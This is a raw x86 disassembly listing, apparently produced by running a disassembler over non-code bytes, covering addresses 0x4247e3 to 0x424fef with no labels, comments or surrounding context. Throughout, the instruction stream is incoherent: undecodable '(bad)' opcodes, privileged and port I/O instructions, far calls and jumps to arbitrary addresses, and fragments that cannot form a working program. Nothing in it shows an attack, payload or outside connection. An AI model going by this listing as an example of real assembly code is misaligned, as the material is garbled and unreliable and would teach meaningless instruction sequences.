  4247e3:	dec    eax
  4247e4:	ins    DWORD PTR es:[edi],dx
  4247e5:	das    
  4247e6:	fwait
  4247e7:	jp     0x4247ad
  4247e9:	sub    ebp,esi
  4247eb:	inc    ebp
  4247ec:	sub    eax,0x75fe6bf3
  4247f1:	add    ch,cl
  4247f3:	cmp    BYTE PTR [edi],0x4e
  4247f6:	jmp    0xe8403ef9
  4247fb:	add    esi,DWORD PTR [ebp+0x77]
  4247fe:	test   bl,dh
  424800:	sti    
  424801:	cmp    eax,0x797d7ad5
  424806:	je     0x424803
  424808:	popf   
  424809:	mov    ecx,0x2f7503e9
  42480e:	loop   0x424867
  424810:	add    BYTE PTR [eax],al
  424812:	add    BYTE PTR [eax],al
  424814:	add    BYTE PTR [ebp+0x75],ch
  424817:	and    ecx,DWORD PTR [eiz*1+0x5aec2b75]
  42481e:	and    BYTE PTR [edi+0x2c017504],al
  424824:	cld    
  424825:	fwait
  424826:	stos   BYTE PTR es:[edi],al
  424827:	outs   dx,DWORD PTR ds:[esi]
  424828:	inc    esi
  424829:	mov    ds,WORD PTR [esi]
  42482b:	xor    bl,BYTE PTR [eax+0x7d]
  42482e:	push   es
  42482f:	into   
  424830:	cld    
  424831:	icebp  
  424832:	mov    ah,0xe9
  424834:	add    esi,DWORD PTR [ebp+0x7e]
  424837:	test   eax,0xe964f6fd
  42483c:	add    esi,DWORD PTR [ebp+0x77]
  42483f:	and    ebx,DWORD PTR [eax-0x43]
  424842:	cmp    bh,ch
  424844:	push   edx
  424845:	lods   eax,DWORD PTR ds:[esi]
  424846:	cmp    ch,dl
  424848:	xchg   cl,dh
  42484a:	add    DWORD PTR [eax],eax
  42484c:	jmp    0x18451c7
  424851:	or     BYTE PTR [edi-0x53],bh
  424854:	jmp    0x5e914acf
  424859:	mov    ds:0xea5652fa,al
  42485e:	push   es
  42485f:	adc    ch,BYTE PTR [ecx-0x22ba848a]
  424865:	cmc    
  424866:	mov    ebp,0x79c9700c
  42486b:	jge    0x42484e
  42486d:	scas   al,BYTE PTR es:[edi]
  42486e:	sbb    bh,bl
  424870:	cs mov eax,0xfaf6c07d
  424876:	jnp    0x424878
  424878:	jmp    0x42487d
  42487d:	add    BYTE PTR [esi+0x5c],dh
  424880:	add    DWORD PTR [ebx+eax*2+0x5e],esp
  424884:	push   0x423f59
  424889:	push   es
  42488a:	dec    eax
  42488b:	(bad)  
  42488c:	out    0x5,eax
  42488e:	icebp  
  42488f:	(bad)  
  424890:	sti    
  424891:	ins    BYTE PTR es:[edi],dx
  424892:	mov    ecx,0x20ee744d
  424897:	bound  eax,QWORD PTR [edi+0x72c7212f]
  42489d:	cmp    eax,0x2486eefc
  4248a2:	jne    0x42484e
  4248a4:	jb     0x42491d
  4248a6:	cmp    BYTE PTR [esi+0x5fcaa984],bh
  4248ac:	jg     0x4248f4
  4248ae:	ins    DWORD PTR es:[edi],dx
  4248af:	add    al,BYTE PTR [edi+0x42c54934]
  4248b5:	xor    eax,0xe9000272
  4248ba:	sbb    eax,0xa927871a
  4248bf:	jmp    0xbd6f6686
  4248c4:	jb     0x4248cf
  4248c6:	lods   al,BYTE PTR ds:[esi]
  4248c7:	dec    edi
  4248c8:	or     al,0x0
  4248ca:	sti    
  4248cb:	push   edi
  4248cc:	pop    esp
  4248cd:	mov    eax,DWORD PTR [ebx]
  4248cf:	fiadd  WORD PTR [ebx-0x6a]
  4248d2:	mov    cl,dh
  4248d4:	test   al,al
  4248d6:	add    BYTE PTR [edx+eiz*2],dl
  4248d9:	add    BYTE PTR [ecx-0x117e801],cl
  4248df:	cwde   
  4248e0:	add    BYTE PTR [eax],al
  4248e2:	add    BYTE PTR [eax],al
  4248e4:	add    BYTE PTR [eax],al
  4248e6:	add    BYTE PTR [ecx+0x6a],ah
  4248e9:	pop    es
  4248ea:	test   ebx,ebp
  4248ec:	into   
  4248ed:	idiv   edi
  4248ef:	addr16 inc edi
  4248f1:	je     0x424876
  4248f3:	xor    al,0x4
  4248f5:	jbe    0x424901
  4248f7:	pop    edi
  4248f8:	int    0x5
  4248fa:	jge    0x4248cd
  4248fc:	cmp    al,BYTE PTR [ebp+0x14]
  4248ff:	lods   eax,DWORD PTR ds:[esi]
  424900:	lods   eax,DWORD PTR ds:[esi]
  424901:	mov    bl,0xa0
  424903:	mov    ebx,0xe23b0005
  424908:	pop    ebp
  424909:	adc    al,al
  42490b:	jp     0x4248d2
  42490d:	jecxz  0x424915
  42490f:	faddp  st(5),st
  424911:	jecxz  0x424915
  424913:	pop    esp
  424914:	add    al,0x57
  424916:	pop    esi
  424917:	out    0xf0,eax
  424919:	mov    ecx,0xc0129c10
  42491e:	inc    eax
  42491f:	add    eax,0x42c36c47
  424924:	inc    ecx
  424925:	icebp  
  424926:	or     edx,0x5a
  424929:	sti    
  42492a:	je     0x424984
  42492c:	hlt    
  42492d:	popa   
  42492e:	add    ch,cl
  424930:	dec    esp
  424931:	pop    esp
  424932:	push   0x405934
  424937:	or     edx,DWORD PTR [ebp+0x4]
  42493a:	call   0x38ce97
  42493f:	mov    ebx,0x5075c083
  424944:	pop    ss
  424945:	rcr    BYTE PTR [esi+0x75],0x6c
  424949:	pop    edx
  42494a:	add    DWORD PTR [eax],eax
  42494c:	add    BYTE PTR [eax],al
  42494e:	add    BYTE PTR [eax],al
  424950:	clc    
  424951:	and    ah,dh
  424953:	ret    0x17bb
  424956:	add    BYTE PTR [eax],al
  424958:	jne    0x424905
  42495a:	xlat   BYTE PTR ds:[ebx]
  42495b:	mov    al,ds:0xafffaac9
  424960:	je     0x424973
  424962:	ret    
  424963:	push   edx
  424964:	out    dx,al
  424965:	pop    ecx
  424966:	jnp    0x4249aa
  424968:	mov    DWORD PTR [ebx+0x2e],esi
  42496b:	je     0x424907
  42496d:	arpl   WORD PTR [edi],si
  42496f:	jne    0x42491f
  424971:	lds    eax,FWORD PTR ds:0x5767638d
  424977:	clc    
  424978:	imul   di,di,0xfffa
  42497c:	dec    edx
  42497d:	scas   eax,DWORD PTR es:[edi]
  42497e:	xlat   BYTE PTR ds:[ebx]
  42497f:	cli    
  424980:	dec    edx
  424981:	icebp  
  424982:	mov    BYTE PTR [ebp+0x2dfb9db5],0xb5
  424989:	adc    ecx,DWORD PTR [edx]
  42498b:	ret    
  42498c:	cmp    eax,DWORD PTR [edi-0x548afffb]
  424992:	ficomp DWORD PTR [eax]
  424994:	out    dx,al
  424995:	outs   dx,BYTE PTR ds:[esi]
  424996:	sbb    ecx,DWORD PTR [edi+ecx*1]
  424999:	stos   BYTE PTR es:[edi],al
  42499a:	js     0x4249e6
  42499c:	and    bh,BYTE PTR gs:[esi]
  42499f:	jo     0x424953
  4249a1:	push   0xaa82fe53
  4249a6:	jmp    edi
  4249a8:	es xchg edi,eax
  4249aa:	(bad)  
  4249ab:	push   DWORD PTR [edx+0x5e]
  4249ae:	and    BYTE PTR [eax],dl
  4249b0:	clc    
  4249b1:	dec    edi
  4249b2:	sub    bl,bh
  4249b4:	add    BYTE PTR [eax],al
  4249b6:	add    BYTE PTR [eax],al
  4249b8:	add    cl,ch
  4249ba:	or     eax,0xa5e2faf4
  4249bf:	xlat   BYTE PTR ds:[ebx]
  4249c0:	mov    esi,0xf3c677d2
  4249c5:	sub    eax,0x1df3bfd5
  4249ca:	add    eax,DWORD PTR [edx+0x2a]
  4249cd:	sti    
  4249ce:	or     ch,cl
  4249d0:	xor    edx,edi
  4249d2:	mov    cl,0x5e
  4249d4:	inc    ecx
  4249d5:	cdq    
  4249d6:	dec    edx
  4249d7:	and    DWORD PTR [ebx],esi
  4249d9:	test   al,0xe1
  4249db:	push   cs
  4249dc:	push   es
  4249dd:	call   0x119e6722
  4249e2:	xor    al,0x29
  4249e4:	add    al,0xe
  4249e6:	cmp    ch,ah
  4249e8:	fucomi st,st(3)
  4249ea:	aas    
  4249eb:	arpl   dx,cx
  4249ed:	lock ret 0xffd4
  4249f1:	mov    al,ds:0xb6233ec2
  4249f6:	dec    eax
  4249f7:	mov    ebp,0xe9027506
  4249fc:	retf   0xe661
  4249ff:	fdivr  DWORD PTR [eax+0x4f]
  424a02:	pop    esi
  424a03:	xor    cl,BYTE PTR [edi-0x6f]
  424a06:	adc    ch,BYTE PTR [edx]
  424a08:	push   edx
  424a09:	jns    0x4249b5
  424a0b:	mov    eax,ds:0x12bfbf4a
  424a10:	stos   DWORD PTR es:[edi],eax
  424a11:	mov    al,dl
  424a13:	sbb    ch,BYTE PTR [ebx-0x4d89fb2]
  424a19:	mov    ds:0x329652,al
  424a1e:	add    BYTE PTR [eax],al
  424a20:	add    BYTE PTR [eax],al
  424a22:	call   0xb5593b67
  424a27:	(bad)  
  424a28:	jmp    0x4249b9
  424a2a:	add    eax,DWORD PTR [edx-0x17]
  424a2d:	fisttp DWORD PTR ds:0xf2c9e2cc
  424a33:	inc    esi
  424a34:	add    eax,0xaadba3f0
  424a39:	add    ch,BYTE PTR [ecx]
  424a3b:	cmp    al,0x29
  424a3d:	add    al,0x36
  424a3f:	pop    es
  424a40:	lods   eax,DWORD PTR ds:[esi]
  424a41:	dec    esi
  424a42:	mov    ch,0x2
  424a44:	jo     0x424a70
  424a46:	(bad)  [ecx-0x7656e900]
  424a4c:	pop    edx
  424a4d:	cmp    eax,0xe9704434
  424a52:	cmp    bh,BYTE PTR [edi-0x75cdec05]
  424a58:	inc    edx
  424a59:	xor    DWORD PTR [ecx-0x77],ebx
  424a5c:	inc    edx
  424a5d:	adc    eax,0x707c5c9e
  424a62:	pop    DWORD PTR [edx-0x76891700]
  424a68:	call   0x5ab0:0x2716d
  424a6f:	out    0xf,al
  424a71:	fisttp QWORD PTR [edi]
  424a73:	dec    edi
  424a74:	sti    
  424a75:	aad    0x92
  424a77:	push   ss
  424a78:	lea    ebp,[esi-0x5972ad7a]
  424a7e:	out    0xa6,al
  424a80:	fisub  DWORD PTR [esi+0x71]
  424a83:	add    bh,BYTE PTR [edi+0x41]
  424a86:	add    BYTE PTR [eax],al
  424a88:	add    BYTE PTR [eax],al
  424a8a:	add    dl,dl
  424a8c:	xor    bh,bh
  424a8e:	pop    edi
  424a8f:	lahf   
  424a90:	ss pop ebx
  424a92:	bound  esi,QWORD PTR [edi-0x46d4a6aa]
  424a98:	mov    esi,0xa9c67255
  424a9d:	psubsw mm6,QWORD PTR [esi+0x2]
  424aa1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424aa3:	or     BYTE PTR [edx],0x1
  424aa6:	jge    0x424b1c
  424aa8:	push   esp
  424aa9:	call   0xfbfe8d05
  424aae:	bound  esi,QWORD PTR [edi+0x76e5be5b]
  424ab4:	mov    ebx,0x27669b2
  424ab9:	add    BYTE PTR [esi+0x29767e74],ah
  424abf:	jno    0x424a82
  424ac1:	inc    edx
  424ac2:	loope  0x424ae6
  424ac4:	xor    eax,0xda4c0040
  424ac9:	js     0x424b40
  424acb:	adc    cl,bl
  424acd:	div    DWORD PTR [esi-0x48]
  424ad0:	fidiv  WORD PTR [eax+0x75]
  424ad3:	adc    cl,bl
  424ad5:	mov    edi,0x78d24446
  424ada:	inc    eax
  424adb:	sbb    al,0xc3
  424add:	(bad)  
  424ade:	mov    bl,0x86
  424ae0:	inc    esi
  424ae1:	add    bl,al
  424ae3:	imul   edi,DWORD PTR [edi],0x3f7d51ec
  424ae9:	dec    ebp
  424aea:	or     al,0x6f
  424aec:	lock dec esi
  424aee:	call   0x424af3
  424af3:	add    BYTE PTR [ebp-0x18],dh
  424af6:	idiv   bh
  424af8:	xchg   edi,eax
  424af9:	hlt    
  424afa:	jnp    0xfcb7839c
  424b00:	inc    esp
  424b01:	in     eax,0x55
  424b03:	inc    DWORD PTR [ebx+0x3e]
  424b06:	jge    0x424b10
  424b08:	push   ebp
  424b09:	cld    
  424b0a:	test   DWORD PTR [ebp-0x72acb266],0x8d051218
  424b14:	and    eax,DWORD PTR [ecx-0xe340000]
  424b1a:	xor    bl,0x64
  424b1d:	xchg   ebp,eax
  424b1e:	je     0x424b1e
  424b20:	xchg   ebx,eax
  424b21:	cmp    eax,0xcad974c0
  424b26:	jne    0x424b24
  424b28:	pop    ss
  424b29:	push   cs
  424b2a:	div    DWORD PTR [ebp-0x60]
  424b2d:	ds xor eax,0x41aa3c
  424b33:	push   edi
  424b34:	xor    DWORD PTR [edx-0x5],0x7c
  424b38:	nop
  424b39:	lds    esi,FWORD PTR [ebp-0x8]
  424b3c:	sub    bh,BYTE PTR [ebp-0x1]
  424b3f:	cmp    DWORD PTR [ebp+eax*8+0x75],edi
  424b43:	adc    BYTE PTR [ebp+0x28],dh
  424b46:	mov    ebx,0xaacccbfe
  424b4b:	(bad)  
  424b4c:	fld    st(3)
  424b4e:	ja     0x424b95
  424b50:	jge    0x424b97
  424b52:	mov    ebx,0x7ea17803
  424b57:	les    eax,FWORD PTR [eax]
  424b59:	add    BYTE PTR [eax],al
  424b5b:	add    BYTE PTR [eax],al
  424b5d:	pop    ebp
  424b5e:	sub    BYTE PTR [ebx-0x53cf02],bh
  424b64:	outs   dx,BYTE PTR es:[esi]
  424b66:	xor    cl,BYTE PTR [esp+eax*4-0x5000548b]
  424b6d:	je     0x424aef
  424b6f:	and    eax,0x42ae2fb
  424b74:	add    BYTE PTR [ebp-0x6d],dh
  424b77:	mov    cl,0x74
  424b79:	or     esi,DWORD PTR [edi+ecx*1]
  424b7c:	rol    BYTE PTR [esi+0x62],0xd
  424b80:	inc    ebp
  424b81:	stc    
  424b82:	xor    DWORD PTR [ebx-0x80],edi
  424b85:	jne    0x424b32
  424b87:	dec    DWORD PTR [eax+0x42ef2]
  424b8d:	jne    0x424b6b
  424b8f:	imul   eax,eax,0x3a
  424b92:	gs es leave 
  424b95:	mov    bh,0xae
  424b97:	(bad)  
  424b98:	jle    0x424b76
  424b9a:	mov    ds:0xebc205dc,al
  424b9f:	ret    0xee55
  424ba2:	push   ss
  424ba3:	test   esp,ebp
  424ba5:	mov    DWORD PTR [ecx+0x65f6ffff],ebp
  424bab:	(bad)  
  424bac:	sti    
  424bad:	inc    esi
  424bae:	jne    0x424bc1
  424bb0:	xlat   BYTE PTR ds:[ebx]
  424bb1:	imul   edi,DWORD PTR [eax-0x7b]
  424bb5:	mov    eax,ds:0x25fbc2bd
  424bba:	mov    ah,0x50
  424bbc:	or     BYTE PTR [edi],cl
  424bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bbf:	daa    
  424bc0:	call   0x424bc5
  424bc5:	add    al,dh
  424bc7:	add    DWORD PTR [ebx],esp
  424bc9:	add    al,0x75
  424bcb:	lea    esp,[edi+edx*8+0x68]
  424bcf:	mov    esp,0x365e33d2
  424bd4:	ffree  st(6)
  424bd6:	loopne 0x424bf2
  424bd8:	sar    edi,1
  424bda:	(bad)  
  424bdb:	mov    esp,0x86457aba
  424be0:	mov    ebx,0x2c7f824f
  424be5:	hlt    
  424be6:	cmp    dh,BYTE PTR [eax]
  424be8:	stc    
  424be9:	(bad)  
  424bea:	test   al,0x12
  424bec:	call   0x724f:0xfcbb8d50
  424bf3:	inc    edx
  424bf4:	jmp    0xbd798179
  424bf9:	(bad)  
  424bfa:	mov    BYTE PTR [esi],dl
  424bfc:	ins    BYTE PTR es:[edi],dx
  424bfd:	inc    eax
  424bfe:	or     eax,0x7559e829
  424c03:	sub    ch,cl
  424c05:	add    esi,DWORD PTR [ebp-0x3e]
  424c08:	bound  edx,QWORD PTR [eax-0x73]
  424c0b:	stos   BYTE PTR es:[edi],al
  424c0c:	cmp    DWORD PTR [eax-0x3c92fd8b],ecx
  424c12:	push   0xdaf04a17
  424c17:	adc    BYTE PTR [ecx-0x6645adfd],ch
  424c1d:	dec    edi
  424c1e:	jbe    0x424c1d
  424c20:	jns    0x424c25
  424c22:	jne    0x424c26
  424c24:	mov    ah,0xfe
  424c26:	mov    esp,0xca69bf
  424c2b:	add    BYTE PTR [eax],al
  424c2d:	add    BYTE PTR [eax],al
  424c2f:	sbb    DWORD PTR [eax],esi
  424c31:	outs   dx,DWORD PTR ds:[esi]
  424c32:	adc    ah,BYTE PTR [edi-0x72345373]
  424c38:	xchg   esp,eax
  424c39:	dec    esp
  424c3a:	add    esi,DWORD PTR [ebp-0x79]
  424c3d:	sub    esp,DWORD PTR ds:0xef27c92a
  424c43:	mov    dl,BYTE PTR [esi+0x0]
  424c46:	bound  ebp,QWORD PTR [edx+0x76835151]
  424c4c:	jp     0x424cc9
  424c4e:	and    ebp,DWORD PTR [esi-0x45]
  424c51:	jecxz  0x424be0
  424c53:	jb     0x424c57
  424c55:	add    BYTE PTR [eax-0x160444bf],dl
  424c5b:	fst    st(1)
  424c5d:	repz retf 
  424c5f:	into   
  424c60:	inc    ebp
  424c61:	clc    
  424c62:	push   ebx
  424c63:	jno    0x424be8
  424c65:	shl    DWORD PTR [eax-0x6e],0xbe
  424c69:	call   0x44bec3
  424c6e:	(bad)  
  424c70:	mov    edx,0x2cfa144
  424c75:	(bad)  
  424c77:	sub    eax,0x76c6102a
  424c7c:	add    dl,BYTE PTR [ecx+0x19]
  424c7f:	xor    DWORD PTR [ecx+ecx*2+0x2bb76e8],ecx
  424c86:	ficom  DWORD PTR [ecx+0x6]
  424c89:	mov    edi,esp
  424c8b:	jg     0x424cdd
  424c8d:	add    al,0x30
  424c8f:	mov    ah,0x82
  424c91:	inc    esp
  424c92:	add    eax,0x0
  424c97:	add    cl,ah
  424c99:	repz inc ebx
  424c9b:	or     eax,0xdb112fe1
  424ca0:	fadd   QWORD PTR [ebx-0xc32f2bc]
  424ca6:	inc    ebx
  424ca7:	add    eax,0xfa052f75
  424cac:	mov    dh,0x41
  424cae:	out    0xeb,eax
  424cb0:	gs ret 0xf9be
  424cb4:	jbe    0x424d0b
  424cb6:	xchg   DWORD PTR ds:0xba30adf4,ecx
  424cbc:	push   eax
  424cbd:	dec    edi
  424cbe:	lea    esp,[edx+ecx*8-0x1eff72af]
  424cc5:	ficom  DWORD PTR [eax-0x73]
  424cc8:	rcl    edx,1
  424cca:	push   eax
  424ccb:	mov    edx,ecx
  424ccd:	mov    dh,0x8c
  424ccf:	pop    ebp
  424cd0:	push   0x5cbf44de
  424cd5:	push   es
  424cd6:	test   al,al
  424cd8:	pop    ebx
  424cd9:	cmp    bh,ch
  424cdb:	add    BYTE PTR [esi+eax*1-0x7d],cl
  424cdf:	inc    ebp
  424ce0:	cmp    BYTE PTR [ebx],bh
  424ce2:	sbb    BYTE PTR [ebx-0x387cfd4c],cl
  424ce8:	(bad)  
  424ce9:	shl    BYTE PTR [edx+0x28a28c00],cl
  424cef:	mov    ecx,0xfffbb8cc
  424cf4:	adc    eax,0x7672eff9
  424cf9:	inc    edi
  424cfa:	add    eax,0x39
  424cff:	add    BYTE PTR [eax],al
  424d01:	sbb    edx,0x48eb136a
  424d07:	lock add ecx,DWORD PTR [esi+0x2fec75be]
  424d0e:	lds    edx,FWORD PTR [eax+0x56]
  424d11:	hlt    
  424d12:	cmp    bh,dh
  424d14:	dec    DWORD PTR [ebx-0x63ce0526]
  424d1a:	cmp    eax,eax
  424d1c:	(bad)  
  424d1e:	xor    BYTE PTR [eax],al
  424d20:	add    ah,cl
  424d22:	cmp    bh,BYTE PTR [edi+0x450c3f8b]
  424d28:	call   0x5b0f93b
  424d2d:	jne    0x424d78
  424d2f:	in     al,0x72
  424d31:	lahf   
  424d32:	mov    esi,0xd3cfe875
  424d37:	div    DWORD PTR [ebp-0x80]
  424d3a:	mov    dl,0xc0
  424d3c:	push   eax
  424d3d:	loop   0x424d1c
  424d3f:	pop    eax
  424d40:	push   DWORD PTR [ebp+0x10]
  424d43:	(bad)  
  424d44:	out    0x77,eax
  424d46:	fnstsw WORD PTR [edi+0x5b37b584]
  424d4c:	xchg   DWORD PTR [edx+0x3839d034],esi
  424d52:	or     edx,DWORD PTR [ecx+0x16]
  424d55:	add    bl,BYTE PTR [esi+0x5d517506]
  424d5b:	adc    edi,ebx
  424d5d:	loopne 0x424d2a
  424d5f:	add    ebp,esi
  424d61:	bound  edx,QWORD PTR [esi-0x20]
  424d64:	sldt   WORD PTR [eax]
  424d67:	add    BYTE PTR [eax],al
  424d69:	add    BYTE PTR [ebx+edi*8],dh
  424d6c:	push   ebp
  424d6d:	call   0xfc020e14
  424d72:	pop    esi
  424d73:	lods   eax,DWORD PTR ds:[esi]
  424d74:	cmc    
  424d75:	mov    edi,0x37386af9
  424d7a:	out    dx,al
  424d7b:	pop    edi
  424d7c:	mov    ebp,edi
  424d7e:	ins    BYTE PTR es:[edi],dx
  424d7f:	out    0xdb,al
  424d81:	outs   dx,BYTE PTR ds:[esi]
  424d82:	(bad)  
  424d83:	adc    BYTE PTR [ecx],cl
  424d85:	cmp    DWORD PTR [eax+0x1a0f3277],ebp
  424d8b:	push   cs
  424d8c:	fdiv   st(7),st
  424d8e:	add    al,0x80
  424d90:	cmp    esp,edx
  424d92:	pushw  0x54
  424d95:	push   edx
  424d96:	or     eax,0xfafbbea9
  424d9b:	add    DWORD PTR [edx],0x2e
  424d9e:	mov    ch,0x26
  424da0:	les    esi,FWORD PTR [edi+eax*4+0x34]
  424da4:	dec    ecx
  424da5:	adc    al,bh
  424da7:	jmp    0x7fbe:0xa2f60337
  424dae:	cmp    eax,0x74b0bea7
  424db3:	push   esp
  424db4:	cmc    
  424db5:	xchg   BYTE PTR [eax-0x61],al
  424db8:	nop
  424db9:	jne    0x424d7c
  424dbb:	inc    edx
  424dbc:	xchg   esi,eax
  424dbd:	cli    
  424dbe:	mov    dl,0x1
  424dc0:	and    al,BYTE PTR [edi+0x37e91228]
  424dc6:	test   BYTE PTR [ecx+eiz*8],ch
  424dc9:	mov    ?,WORD PTR [edi+0x390a51]
  424dcf:	add    BYTE PTR [eax],al
  424dd1:	add    BYTE PTR [eax],al
  424dd3:	gs mov ecx,0x4264ffdc
  424dd9:	jmp    0x5e480764
  424dde:	popa   
  424ddf:	ins    DWORD PTR es:[edi],dx
  424de0:	xchg   DWORD PTR [edi+esi*4+0x543952c5],esp
  424de7:	pop    ebp
  424de8:	push   ebp
  424de9:	call   0x2c5f:0x33577503
  424df0:	(bad)
  424df3:	test   al,0x8b
  424df5:	aad    0x84
  424df7:	pop    ecx
  424df8:	sbb    esp,edi
  424dfa:	add    esi,DWORD PTR [ebp+0x53]
  424dfd:	sbb    ebx,DWORD PTR [ebx+0x3e]
  424e00:	fst    QWORD PTR cs:[eax-0x3d5b5908]
  424e07:	cs mov eax,0xaac50c14
  424e0d:	test   BYTE PTR [edi],dh
  424e0f:	pop    ds
  424e10:	mov    eax,0xb0f8b35e
  424e15:	xacquire xchg DWORD PTR [esi],esi
  424e18:	add    ebp,ecx
  424e1a:	add    edx,DWORD PTR [edi+0x6e03b383]
  424e20:	jle    0x424e4e
  424e22:	add    esi,DWORD PTR [ebp+0x2]
  424e25:	push   ax
  424e27:	jns    0x424de0
  424e29:	push   ss
  424e2a:	ret    
  424e2b:	clc    
  424e2c:	mov    bh,0xdc
  424e2e:	adc    al,0xe8
  424e30:	jge    0x424e6f
  424e32:	ror    dh,0xb7
  424e35:	cdq    
  424e36:	ret    0x0
  424e39:	add    BYTE PTR [eax],al
  424e3b:	add    BYTE PTR [eax+0x3a],ah
  424e3e:	(bad)  
  424e3f:	inc    ebx
  424e40:	jne    0x424ebf
  424e42:	add    BYTE PTR [ecx],ch
  424e44:	cmp    ch,0xb7
  424e47:	jmp    0xb94050c2
  424e4c:	pop    eax
  424e4d:	mov    bh,0x69
  424e4f:	out    0x4e,al
  424e51:	add    al,BYTE PTR [eax]
  424e53:	jmp    0xfdc7d38e
  424e58:	sar    BYTE PTR [ebx+0x3de599fb],cl
  424e5e:	or     al,0x11
  424e60:	xlat   BYTE PTR ds:[ebx]
  424e61:	outs   dx,DWORD PTR ds:[esi]
  424e62:	add    cl,ch
  424e64:	bnd ret 0x7174
  424e68:	add    eax,0xf239f43d
  424e6d:	mov    edx,0x2d340e75
  424e72:	adc    BYTE PTR [edx+esi*4+0x6],ah
  424e76:	push   eax
  424e77:	shl    DWORD PTR [esi-0x2390444],0xc1
  424e7e:	je     0x424ec9
  424e80:	clc    
  424e81:	xor    al,0xf4
  424e83:	mov    dh,0x82
  424e85:	fistp  QWORD PTR [esi+0x2c]
  424e88:	icebp  
  424e89:	mov    edx,0x53cdcc75
  424e8e:	lea    esp,[ebx*8-0x7ae304af]
  424e95:	mov    ebx,0x42669515
  424e9a:	add    BYTE PTR [ecx+esi*1-0x61],ch
  424e9e:	adc    BYTE PTR [eax+eax*1+0x0],ch
  424ea2:	add    BYTE PTR [eax],al
  424ea4:	add    BYTE PTR [edx-0x5ee6af52],bh
  424eaa:	test   DWORD PTR [ebp-0x23],ebx
  424ead:	push   ds
  424eae:	xchg   ebx,eax
  424eaf:	mov    edx,0xc07e76e9
  424eb4:	aad    0xe5
  424eb6:	mov    ebx,0xcb5e575
  424ebb:	or     al,0xfa
  424ebd:	add    bh,BYTE PTR ss:[edi+0x0]
  424ec1:	add    DWORD PTR [edi],eax
  424ec3:	not    DWORD PTR [esi+0x1b]
  424ec6:	ret    0xb815
  424ec9:	lahf   
  424eca:	inc    edx
  424ecb:	add    BYTE PTR [ebp+0x6601fa5c],al
  424ed1:	pop    ds
  424ed2:	add    al,0x0
  424ed4:	nop    DWORD PTR [edi-0x9]
  424ed8:	inc    DWORD PTR [ebx+0x740c4587]
  424ede:	sbb    dh,BYTE PTR [ebx+0x1329c00]
  424ee4:	jmp    0x424e6c
  424ee6:	xchg   DWORD PTR [ebp+0xc],eax
  424ee9:	je     0x424ef1
  424eeb:	mov    bl,0x0
  424eed:	pop    esp
  424eee:	mov    al,0xbb
  424ef0:	pop    edi
  424ef1:	mov    dl,0x57
  424ef3:	leave  
  424ef4:	ret    0x250
  424ef7:	push   ebp
  424ef8:	mov    esi,DWORD PTR [eax]
  424efa:	push   ecx
  424efb:	push   ecx
  424efc:	push   ebx
  424efd:	mov    al,BYTE PTR [edi+0x422ec035]
  424f03:	add    BYTE PTR [eax+0x1c],ch
  424f06:	idiv   DWORD PTR [edi]
  424f08:	add    BYTE PTR [eax],al
  424f0a:	add    BYTE PTR [eax],al
  424f0c:	add    BYTE PTR [eax],al
  424f0e:	add    edi,DWORD PTR [ebx-0x4d4b290a]
  424f14:	jb     0x424f56
  424f16:	sbb    al,0xc3
  424f18:	das    
  424f19:	mov    esi,DWORD PTR [ebx+eax*8]
  424f1c:	into   
  424f1d:	sub    DWORD PTR [ecx+0x76],0x0
  424f21:	mov    ebp,esp
  424f23:	jl     0x424ef8
  424f25:	je     0x424f4b
  424f27:	jge    0x424f17
  424f29:	je     0x424f63
  424f2b:	test   DWORD PTR [ebp-0x4],eax
  424f2e:	pop    esp
  424f2f:	in     al,0xff
  424f31:	(bad)  
  424f32:	jmp    0x5a164640
  424f37:	shl    DWORD PTR [ebp+0x15],0x43
  424f3b:	in     al,dx
  424f3c:	or     ecx,DWORD PTR [ebx+0x75bfe475]
  424f42:	rol    DWORD PTR [ebx+0xe],1
  424f45:	add    BYTE PTR [ebp-0x55],dh
  424f48:	shl    BYTE PTR [ebp-0x3f],0x32
  424f4c:	inc    edx
  424f4d:	clc    
  424f4e:	mov    edx,0xad458c15
  424f53:	test   DWORD PTR [ecx+ecx*8-0x49],ebx
  424f57:	mov    bl,0xff
  424f59:	push   esp
  424f5a:	out    dx,al
  424f5b:	pop    es
  424f5c:	test   ah,ch
  424f5e:	sub    DWORD PTR [eax+0x59],edi
  424f61:	xchg   DWORD PTR [eax-0x15],ecx
  424f64:	adc    al,0x40
  424f66:	jne    0x424efc
  424f68:	mov    eax,?
  424f6a:	or     eax,0x75403c6b
  424f6f:	lods   al,BYTE PTR ds:[esi]
  424f70:	repz ret 0x0
  424f74:	add    BYTE PTR [eax],al
  424f76:	add    BYTE PTR [eax+0x750020b7],bh
  424f7c:	stos   DWORD PTR es:[edi],eax
  424f7d:	mov    edx,0x36f7cdd2
  424f82:	inc    eax
  424f83:	jne    0x424f51
  424f85:	xrelease xchg BYTE PTR ds:0xc168d2c4,ch
  424f8c:	inc    eax
  424f8d:	inc    esp
  424f8e:	add    BYTE PTR [edx-0x54],al
  424f91:	mov    WORD PTR [ebp+0x45],es
  424f94:	ins    BYTE PTR es:[edi],dx
  424f95:	shr    BYTE PTR [edi],cl
  424f97:	sub    esp,DWORD PTR [edx]
  424f99:	dec    ecx
  424f9a:	call   0x844e0d0d
  424f9f:	data16 stos BYTE PTR es:[edi],al
  424fa1:	(bad)  
  424fa2:	call   FWORD PTR [esi+edx*1-0x4c]
  424fa6:	or     edi,ecx
  424fa8:	rol    BYTE PTR [eax+eax*1],0x75
  424fac:	rol    ch,0xb
  424faf:	stc    
  424fb0:	enter  0x4,0x75
  424fb4:	push   ds
  424fb5:	dec    ecx
  424fb6:	hlt    
  424fb7:	inc    ebp
  424fb8:	push   esi
  424fb9:	dec    ecx
  424fba:	cld    
  424fbb:	inc    ebp
  424fbc:	add    dh,BYTE PTR [eax+0x39]
  424fbf:	fisttp QWORD PTR [edx+0x2eecbfd4]
  424fc5:	pop    ebp
  424fc6:	mov    edi,0xf297ec2
  424fcb:	lock jmp edi
  424fce:	add    esi,DWORD PTR [ebp-0x77]
  424fd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fd2:	mov    bh,0x82
  424fd4:	mov    esp,0x1a687e2
  424fd9:	jmp    0x424fe1
  424fde:	add    BYTE PTR [eax],al
  424fe0:	ins    BYTE PTR es:[edi],dx
  424fe1:	das    
  424fe2:	and    eax,0xe9a3f90f
  424fe7:	add    esi,DWORD PTR [ebp-0x56]
  424fea:	xor    BYTE PTR [ebx],0x8f
  424fed:	mov    ah,0x5e
  424fef:	fadd   QWORD PTR [edx-0x2c]
